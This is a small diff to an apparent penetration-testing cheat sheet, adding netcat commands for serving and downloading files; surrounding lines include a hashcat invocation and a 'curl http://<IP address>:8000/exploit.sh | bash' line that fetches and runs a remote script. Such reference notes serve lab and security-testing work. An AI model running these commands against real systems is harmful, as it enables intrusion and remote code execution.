@@ -263,7 +263,7 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 - Host Files
 
 ```
-$ nc -nlvp 443
+$ nc -nlvp 443 < file.txt
 $ python -m SimpleHTTPServer 80
 $ python3 -m http.server 8000
 ```
@@ -271,6 +271,7 @@ $ python3 -m http.server 8000
 - Download Files
 
 ```
+$ nc -nv <IP address> 443 > file.txt
 $ wget http://<IP address>:8000/exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
 ```
